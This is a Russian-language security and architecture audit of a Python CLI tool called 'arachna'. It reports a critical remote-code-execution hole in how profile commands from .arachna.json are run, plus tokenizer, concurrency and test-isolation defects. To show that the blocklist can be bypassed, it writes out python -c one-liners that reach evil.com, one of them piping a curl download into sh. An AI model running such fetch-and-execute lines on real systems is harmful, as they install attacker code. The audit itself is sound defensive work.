## Безопасность

### [CRITICAL] src/arachna/runner.py:131-143 — RCE через command в .arachna.json

**Суть**: `run_command` исполняет `command` из профиля через `shell=True` при наличии shell-метасимволов. Блокировка `_BLOCKED_PATTERNS` — это строковый фильтр, который тривиально обходится (пробелы, кодирование, подстановка). Не требуется социальная инженерия — достаточно открыть проект с вредоносным `.arachna.json` и запустить `arachna --all`.

**Влияние сейчас**: любой публичный репозиторий с `.arachna.json` может выполнить код на машине разработчика. README честно предупреждает "Only use .arachna.json from trusted sources", но пользователи не читают README перед клонированием.

**Риск при росте**: с ростом популярности инструмента — целевая атака на supply chain. Безопасность через allowlist утилит не работает: `python -c "import os; os.system('...')"` проходит.

**Обход блокировки** (демонстрация):

    # _BLOCKED_PATTERNS содержит "curl", но не содержит причину:
    python -c "import urllib.request; urllib.request.urlopen('http://evil.com/...')"
    
    # Или проще — python проходит allowlist:
    python -c "import os; os.system('curl evil.com | sh')"

**Исправление**: перед v1.0.0 должен быть sandbox (контейнер/nsjail) или как минимум dry-run команды перед выполнением + интерактивный просмотр. Строковый фильтр нужно удалить — он даёт ложное чувство безопасности. Команды должны выполняться только после явного подтверждения пользователем.

### [HIGH] src/arachna/runner.py:22-56 — _ALLOWED_COMMANDS как единственная защита

**Суть**: allowlist содержит `python`, `node`, `ruby`, `perl`, `php` — пять интерпретаторов, каждый из которых может выполнить произвольный код. Фильтр защищает от `curl`, но пропускает `python -c "import os; os.system('curl ... | bash')"`. Это не безопасность, а её имитация.

**Влияние сейчас**: см. CRITICAL выше.

**Риск при росте**: аудит показывает, что предыдущий аудитор предлагал "allowlist безопасных утилит" — это было реализовано, но проблема не решена, потому что интерпретаторы по определению небезопасны. Каждый новый инструмент в allowlist расширяет поверхность атаки.

**Рекомендация**: убрать `python`, `node`, `ruby`, `perl`, `php` из allowlist. Если профилю нужен вывод команды, она должна быть строго read-only: `git log`, `tree`, `cat`, `grep`, `find`. Интерпретаторы — только через отдельный флаг `--allow-scripts` с явным предупреждением.

## Архитектура

### [HIGH] src/arachna/gatherer.py:16, src/arachna/splitter.py:3 — splitter игнорирует кастомный токенизатор

**Суть**: `gatherer.py` использует глобальную `_TOKENIZE` (которую можно заменить через `set_tokenizer()`), но `splitter.py` импортирует `count_tokens` напрямую из `tokenizer.py` — всегда дефолтный. В результате: если пользователь настроил точный токенизатор (tiktoken/transformers), сбор секций использует его, а разбивка на части — нет. Части могут превысить лимит токенов.

**Влияние сейчас**: молчаливое превышение `max_tokens` в выходных файлах при использовании кастомного токенизатора. Пользователь думает что у него 16000 токенов, а на самом деле может быть 20000+.

**Риск при росте**: баг существует с v0.6.0 (pluggable tokenizer) и не обнаружен тестами, потому что splitter тесты используют дефолтный токенизатор. Это архитектурный дефект: глобальное состояние + прямой импорт в обход состояния.

**Исправление**: передавать tokenizer как параметр в `split()` или использовать `get_tokenizer()` из gatherer.py. TODO.md фиксирует эту задачу как M-02 — она должна быть приоритетнее остальных MEDIUM.

Путь бага:

    config → tokenizer = "tiktoken:cl100k_base"
    → collector.py: set_tokenizer(load_tokenizer(...))  # глобальный _TOKENIZE
    → gatherer.py: _TOKENIZE(section)  # правильно, точный токенизатор
    → splitter.py: count_tokens(section)  # БАГ — всегда дефолтный 4 chars/token

### [HIGH] src/arachna/collector.py:33-40 — гонка операций с манифестом

**Суть**: `_cmd_single` (в `__main__.py`) делает `clean_manifest → collect → save_manifest` — три раздельных вызова без блокировок. При параллельных запусках (разные профили в разных терминалах) возможна потеря записей в манифесте.

**Влияние сейчас**: низкое (маловероятный сценарий для CLI-утилиты).

**Риск при росте**: при интеграции в CI/CD или IDE-плагины параллельные запуски станут реальностью. Плюс `save_manifest` использует `write_text` без атомарности — краш во время записи оставит повреждённый JSON.

**Исправление**: TODO.md уже содержит эту задачу. Приоритет — реализовать в v0.7.0, до публичного релиза.

### [HIGH] src/arachna/__main__.py:171-204 — дублирование _cmd_all и _cmd_single

**Суть**: `_cmd_all` и `_cmd_single` реализуют один и тот же workflow (получить профили → собрать → вывести результат), но разным кодом. При добавлении фичи (например, `--incremental` для отдельных профилей) придётся править в двух местах.

**Влияние сейчас**: `_cmd_all` не поддерживает `--incremental` — флаг игнорируется при `--all`. Баг или фича? Документация молчит.

**Риск при росте**: расхождение поведения будет нарастать. Уже сейчас `_cmd_all` обновляет манифест иначе чем `_cmd_single`.

**Исправление**: TODO.md фиксирует задачу, она закрыта в v0.7.0 согласно TODO, но в коде всё ещё на месте. Либо рефакторинг не завершён, либо TODO неточен. Нужно верифицировать.

### [MEDIUM] src/arachna/gatherer.py:16 — _TOKENIZE как глобальное состояние

**Суть**: `set_tokenizer()` меняет модульную переменную — побочный эффект для всех тестов в рамках одного процесса. Уже сейчас тесты вынуждены использовать `patch` для изоляции. При использовании arachna как библиотеки несколько вызовов с разными токенизаторами будут мешать друг другу.

**Влияние сейчас**: тесты gatherer зависят от порядка выполнения (если не использовать patch). Потенциальный источник flaky tests.

**Риск при росте**: блокирует использование arachna как библиотеки в многопоточном коде. Каждый вызов `set_tokenizer` — глобальный сайд-эффект.

**Исправление**: dependency injection — передавать tokenizer параметром в `_collect_named_sections`, `split`, `dry_run`. Глобальную переменную оставить только для обратной совместимости с пометкой deprecated.

### [MEDIUM] src/arachna/splitter.py:79 — необратимое усечение в _handle_single

**Суть**: `_handle_single` обрезает текст до `max_tokens * 4` символов без информации о том, сколько контента потеряно. Вызывающий код не знает, что контент был усечён.

**Влияние сейчас**: в режиме `single` пользователь может не заметить потерю данных. Заглушка `# ... truncated ...` легко теряется в длинном выводе.

**Риск при росте**: если AI начнёт принимать решения на основе усечённого контекста — ошибки будут списываться на модель, а не на усечение.

**Исправление**: возвращать `(text, was_truncated, original_tokens)` или логировать предупреждение в stderr на уровне collector.

### [MEDIUM] src/arachna/gatherer.py:27 — God function _collect_named_sections

**Суть**: 47 строк, три зоны ответственности: pre_commands, сканирование директорий, чтение files. При добавлении нового источника контента (например, URL) функция продолжит расти.

**Влияние сейчас**: тестировать инкрементальный режим приходится через интеграционные тесты с временными директориями.

**Риск при росте**: каждый новый источник контента требует правки этой функции. Нарушение OCP.

**Исправление**: декомпозировать на `_collect_pre_commands`, `_scan_directories`, `_collect_specific_files`. Уже в TODO.md.

## Тестопригодность

### [HIGH] tests/ — os.chdir блокирует параллельный запуск тестов

**Суть**: 90% тестов делают `os.chdir(tmpdir)` — это меняет глобальное состояние процесса. При параллельном запуске (pytest-xdist) тесты будут мешать друг другу. Особенно критично: тесты tokenizer меняют `sys.path`, тесты gatherer патчат `pathlib.Path.cwd`.

**Влияние сейчас**: `pytest-xdist` не работает. На проекте из 180+ тестов прогон идёт последовательно — медленно.

**Риск при росте**: при 300+ тестах время прогона станет проблемой для CI/CD.

**Двойное патчение** (пример из test_collect_sections.py):

    os.chdir(d)                          # глобальная смена cwd
    with patch("pathlib.Path.cwd", ...): # ещё и патч cwd
        # ...

Это избыточно и указывает на несогласованность в коде: где-то используется `Path.cwd()`, где-то `os.getcwd()`.

**Исправление**: перейти на `tmp_path` + `monkeypatch.chdir`. Задача в TODO.md, отмечена как M-04.

---

### [MEDIUM] tests/config/test_get_profile.py — зависимость от родительского .arachna.json

**Суть**: тесты ищут конфиг через `find_config()`, которая поднимается по дереву директорий. Если у разработчика есть `.arachna.json` в домашней директории, тесты найдут его и упадут.

**Влияние сейчас**: flaky tests у разработчиков, которые используют arachna для своих проектов.

**Риск при росте**: новые разработчики не поймут почему тесты падают.

**Исправление**: использовать `monkeypatch` для подмены `find_config` или `cwd` на временную директорию.

---

### [MEDIUM] tests/runner/test_run_command.py — зависимость от системных утилит

**Суть**: тесты вызывают `echo` — это работает на Unix, но упадёт на Windows (где `echo` — встроенная команда cmd, а не отдельный бинарник).

**Влияние сейчас**: arachna заявляет Python 3.11+, но тесты не кроссплатформенные.

**Риск при росте**: CI/CD на Windows будет красным.

**Исправление**: мокировать `subprocess.run` во всех тестах runner. Системные вызовы должны быть в интеграционных тестах, не в unit.

## Низкоприоритетные находки

### [LOW] src/arachna/config.py:8-24 и src/arachna/gitignore.py:10-17 — дублирование исключаемых директорий

**Суть**: `DEFAULT_EXCLUDE` в config.py и `EXCLUDED_DIRS` в gitignore.py содержат пересекающиеся списки (`venv`, `node_modules`, `__pycache__`). При добавлении новой директории (например, `.pixi`) нужно править два файла.

**Влияние сейчас**: никакого — списки стабильны.

**Риск при росте**: рассинхронизация при добавлении новых паттернов.

---

### [LOW] src/arachna/splitter.py:80 — магическое число 4

**Суть**: `max_chars = max_tokens * 4` — константа 4 неявно связана с `count_tokens` в tokenizer.py. При смене токенизатора усечение будет некорректным.

**Влияние сейчас**: при использовании дефолтного токенизатора — корректно. При кастомном — ошибка.

**Риск при росте**: при исправлении H-02 (проброс токенизатора в splitter) эта строка должна использовать реальный токенизатор для усечения, а не магическую константу.
